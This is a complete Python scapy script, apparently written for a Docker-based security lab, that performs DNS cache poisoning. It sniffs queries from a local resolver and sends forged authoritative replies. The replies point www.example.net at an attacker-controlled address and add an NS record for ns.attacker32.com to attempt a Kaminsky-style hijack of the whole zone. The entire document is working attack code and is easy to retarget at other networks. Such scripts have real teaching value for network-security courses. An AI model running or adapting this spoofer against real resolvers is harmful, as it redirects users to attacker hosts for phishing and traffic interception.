#!/usr/bin/env python3
"""
Sniff UDP query packets from local DNS server and invoke spoof_dns().
"""

from scapy.all import DNS, IP, sniff, UDP, DNSRR, send, get_if_addr, get_if_list


def find_iface(bridge_ip='10.9.0.1'):
    """Auto-detect the host bridge interface for the 10.9.0.0/24 lab network.

    The attacker runs with network_mode: host, so it sees the Docker bridge
    (br-<id>) that backs net-10.9.0.0. The bridge's own address is 10.9.0.1,
    so we locate the interface by that address instead of hard-coding a
    br-<id> name (which changes every time the network is recreated).
    """
    for iface in get_if_list():
        try:
            if get_if_addr(iface) == bridge_ip:
                return iface
        except Exception:
            continue
    raise SystemExit(
        f"Could not find the interface for {bridge_ip}. Is the lab running, "
        "and is this container started with network_mode: host?")


IFACE = find_iface()

# Poison the cache of the local DNS server so www.example.net resolves to
# the attacker-chosen address below (instead of the real 93.184.216.34).
FILTER = 'udp and src host 10.9.0.53 and dst port 53'
DOMAIN = 'www.example.net'
# Attacker-controlled address the victim will be sent to.
SPOOFED_IP = '192.168.0.100'  # attacker-controlled host


def spoof_dns(pkt):
    if DNS in pkt:
        if DOMAIN in pkt[DNS].qd.qname.decode('utf-8'):
            print(
                f"DNS: {pkt[IP].src}: {pkt[UDP].sport} --> \
                    {pkt[IP].dst}: {pkt[UDP].dport} id: {pkt[DNS].id} \
                        {pkt[DNS].qd.qname.decode('utf-8')}")
            print(f'Found {DOMAIN} in query...')
            # Swap the source and destination IP address
            IP_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

            # Swap the source and destination port number
            UDP_pkt = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)

            # The Answer Section
            Ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                            rdata=SPOOFED_IP, ttl=259200)

            # The Authority Section.
            # NOTE: this NS record attempts the full-domain (Kaminsky) hijack,
            # pointing the whole example.net zone at the attacker's name
            # server. The victim resolver only acts on it when it resolves
            # example.net ITERATIVELY. In this self-contained lab example.net
            # is a forward zone, so the resolver forwards every query to the
            # legit server and ignores this record -- only the A record above
            # is cached (per-name poisoning). Build a lab root/TLD (iterative
            # resolution) to demonstrate the NS hijack as well.
            NS_sec = DNSRR(rrname=DOMAIN, type='NS',
                           rdata='ns.attacker32.com', ttl=259200)

            # Construct the DNS packet
            # qr = 1 (response), opcode = 0 (standard query),
            # aa = 1 (authoritative answer)
            DNS_pkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                          qdcount=1, ancount=1, an=Ans_sec, nscount=1,
                          ns=NS_sec)

            # Construct the entire IP packet and send it out
            spoofpkt = IP_pkt/UDP_pkt/DNS_pkt
            print("Sending spoofed packet")
            print(spoofpkt.show())
            send(spoofpkt)
        else:
            print('No DNS query for ', DOMAIN,
                  pkt[DNS].qd.qname.decode('utf-8'))


if __name__ == "__main__":
    print('Starting DNS Cache Poisoning Attack...')
    pkt = sniff(iface=IFACE, filter=FILTER, prn=spoof_dns)
